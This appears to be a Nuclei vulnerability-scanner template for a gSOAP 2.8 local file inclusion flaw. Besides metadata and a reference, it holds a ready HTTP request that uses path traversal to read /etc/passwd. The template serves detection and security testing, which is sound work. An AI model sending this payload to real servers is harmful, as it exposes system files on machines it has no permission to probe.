# Nuclei Template: gSOAP 2.8 - Local File Inclusion
**Template ID:** gsoap-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`gsoap-lfi.yaml`)

## Vulnerability Information & PoC

## Description
gSOAP 2.8 is vulnerable to local file inclusion.

## Steps to reproduce / Exploit Payload
```http
GET /../../../../../../../../../etc/passwd HTTP/1.1
Host: {{Hostname}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close
```

## References
- https://www.exploit-db.com/exploits/47653
